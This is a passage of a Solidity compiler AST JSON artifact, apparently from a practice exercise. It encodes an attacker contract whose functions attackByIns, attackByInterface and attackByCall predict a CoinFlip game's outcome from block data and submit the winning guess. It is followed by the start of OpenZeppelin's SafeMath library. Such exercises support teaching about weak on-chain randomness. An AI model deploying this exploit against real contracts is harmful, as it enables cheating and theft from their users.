																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 145,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1770:39:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1749:60:0"
											},
											{
												"assignments": [
													148
												],
												"declarations": [
													{
														"constant": false,
														"id": 148,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 165,
														"src": "1820:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 147,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1820:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 153,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 151,
															"name": "FACTOR",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 107,
															"src": "1854:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 149,
															"name": "blockValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 135,
															"src": "1839:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 150,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "div",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 342,
														"src": "1839:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 152,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1839:22:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1820:41:0"
											},
											{
												"assignments": [
													155
												],
												"declarations": [
													{
														"constant": false,
														"id": 155,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 165,
														"src": "1872:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 154,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1872:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 162,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 158,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 156,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 148,
															"src": "1884:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "31",
															"id": 157,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1896:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "1884:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "66616c7365",
														"id": 160,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1907:5:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 161,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "1884:28:0",
													"trueExpression": {
														"argumentTypes": null,
														"hexValue": "74727565",
														"id": 159,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1900:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1872:40:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 163,
													"name": "side",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 155,
													"src": "1930:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 133,
												"id": 164,
												"nodeType": "Return",
												"src": "1923:11:0"
											}
										]
									},
									"documentation": null,
									"id": 166,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getFlip",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 130,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1712:2:0"
									},
									"returnParameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 132,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 166,
												"src": "1732:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 131,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1732:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1731:6:0"
									},
									"scope": 216,
									"src": "1696:246:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 180,
										"nodeType": "Block",
										"src": "2049:68:0",
										"statements": [
											{
												"assignments": [
													170
												],
												"declarations": [
													{
														"constant": false,
														"id": 170,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 180,
														"src": "2060:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 169,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "2060:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 173,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 171,
														"name": "getFlip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "2072:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$__$returns$_t_bool_$",
															"typeString": "function () returns (bool)"
														}
													},
													"id": 172,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2072:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2060:21:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 177,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 170,
															"src": "2104:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 174,
															"name": "cf_ins",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 102,
															"src": "2092:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$87",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 176,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 86,
														"src": "2092:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 178,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2092:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 179,
												"nodeType": "ExpressionStatement",
												"src": "2092:17:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "83e00525",
									"id": 181,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attackByIns",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 167,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2039:2:0"
									},
									"returnParameters": {
										"id": 168,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2049:0:0"
									},
									"scope": 216,
									"src": "2019:98:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 195,
										"nodeType": "Block",
										"src": "2239:74:0",
										"statements": [
											{
												"assignments": [
													185
												],
												"declarations": [
													{
														"constant": false,
														"id": 185,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 195,
														"src": "2250:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 184,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "2250:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 188,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 186,
														"name": "getFlip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "2262:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$__$returns$_t_bool_$",
															"typeString": "function () returns (bool)"
														}
													},
													"id": 187,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2262:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2250:21:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 192,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 185,
															"src": "2300:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 189,
															"name": "cf_interface",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 104,
															"src": "2282:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlipInterface_$95",
																"typeString": "contract CoinFlipInterface"
															}
														},
														"id": 191,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 94,
														"src": "2282:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 193,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2282:23:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 194,
												"nodeType": "ExpressionStatement",
												"src": "2282:23:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "b6f02db9",
									"id": 196,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attackByInterface",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 182,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2229:2:0"
									},
									"returnParameters": {
										"id": 183,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2239:0:0"
									},
									"scope": 216,
									"src": "2203:110:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 214,
										"nodeType": "Block",
										"src": "2389:104:0",
										"statements": [
											{
												"assignments": [
													200
												],
												"declarations": [
													{
														"constant": false,
														"id": 200,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 214,
														"src": "2400:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 199,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "2400:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 203,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 201,
														"name": "getFlip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "2412:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$__$returns$_t_bool_$",
															"typeString": "function () returns (bool)"
														}
													},
													"id": 202,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2412:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2400:21:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "666c697028626f6f6c29",
																	"id": 209,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2466:12:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																		"typeString": "literal_string \"flip(bool)\""
																	},
																	"value": "flip(bool)"
																},
																{
																	"argumentTypes": null,
																	"id": 210,
																	"name": "side",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 200,
																	"src": "2479:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																		"typeString": "literal_string \"flip(bool)\""
																	},
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 207,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "2442:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 208,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2442:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 211,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2442:42:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 204,
															"name": "addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 100,
															"src": "2432:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 206,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2432:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 212,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2432:53:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 213,
												"nodeType": "ExpressionStatement",
												"src": "2432:53:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "1a13ff68",
									"id": 215,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attackByCall",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 197,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2379:2:0"
									},
									"returnParameters": {
										"id": 198,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2389:0:0"
									},
									"scope": 216,
									"src": "2358:135:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 217,
							"src": "1159:1339:0"
						}
					],
					"src": "0:2500:0"
				},
				"id": 0
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							412
						]
					},
					"id": 413,
					"license": null,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 218,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 219,
								"nodeType": "StructuredDocumentation",
								"src": "25:563:1",
								"text": " @dev Wrappers over Solidity's arithmetic operations with added overflow\n checks.\n Arithmetic operations in Solidity wrap on overflow. This can easily result\n in bugs, because programmers usually assume that an overflow raises an\n error, which is the standard behavior in high level programming languages.\n `SafeMath` restores this intuition by reverting the transaction when an\n operation overflows.\n Using this library instead of the unchecked operations eliminates an entire\n class of bugs, so it's recommended to use it always."
							},
							"fullyImplemented": true,
							"id": 412,
							"linearizedBaseContracts": [
								412
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 244,
										"nodeType": "Block",
										"src": "901:109:1",
										"statements": [
											{
												"assignments": [
													230
												],
												"declarations": [
													{
														"constant": false,
														"id": 230,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 244,
														"src": "911:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 229,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "911:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 234,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 233,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 231,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 222,
														"src": "923:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 232,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 224,
														"src": "927:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "923:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "911:17:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 238,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 236,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 230,
																"src": "946:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 237,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 222,
																"src": "951:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "946:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 239,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "954:29:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 235,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "938:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 240,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "938:46:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 241,
												"nodeType": "ExpressionStatement",
												"src": "938:46:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 242,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 230,
													"src": "1002:1:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 228,
												"id": 243,
												"nodeType": "Return",
												"src": "995:8:1"
											}
										]
									},
									"documentation": {
										"id": 220,
										"nodeType": "StructuredDocumentation",
										"src": "612:217:1",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 245,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 225,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 222,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 245,
												"src": "847:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 221,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "847:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 224,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 245,
												"src": "858:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 223,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "858:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "846:22:1"
									},
									"returnParameters": {
										"id": 228,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 227,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 245,
												"src": "892:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 226,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "892:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "891:9:1"
									},
									"scope": 412,
									"src": "834:176:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 261,
										"nodeType": "Block",
										"src": "1341:67:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 256,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 248,
															"src": "1362:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 257,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 250,
															"src": "1365:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 258,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1368:32:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 255,
														"name": "sub",
